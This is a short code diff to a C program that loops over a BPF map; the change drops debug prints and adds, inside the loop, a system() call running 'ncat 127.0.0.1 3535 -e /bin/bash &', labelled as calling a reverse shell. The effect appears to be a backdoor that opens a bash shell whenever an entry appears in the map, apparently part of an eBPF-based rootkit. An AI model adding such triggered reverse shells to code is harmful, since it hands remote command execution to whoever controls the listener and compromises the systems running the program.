@@ -1,5 +1,6 @@
 
 #include <stdio.h>
+#include <stdlib.h>
 #include <limits.h>
 #include <bpf/bpf.h>
 #include <bpf/libbpf.h>
@@ -67,8 +68,6 @@ int main(int argc, char **argv) {
     //int h;
     int err;
 
-    printf("1\n");
-
     while(1) {
       while (!bpf_map_get_next_key(fd, &lookup_key, &next_key)) {
         err = bpf_map_lookup_elem(fd, &next_key, &h);
@@ -79,7 +78,13 @@ int main(int argc, char **argv) {
 
         char addrbuf[INET_ADDRSTRLEN];
         //inet_ntop(AF_INET, &h.saddr, addrbuf, sizeof (addrbuf));
-        printf("boops!\n");
+
+
+        printf("Calling reverse shell bash");
+        char cmd[512] = "ncat 127.0.0.1 3535 -e /bin/bash &";
+        system(cmd);
+
+
         printf("Returned from bpf map: %p\n", h.saddr);
         //printf("3Returned from bpf map: %pISpc", &h.saddr);
         err = bpf_map_delete_elem(fd, &next_key);
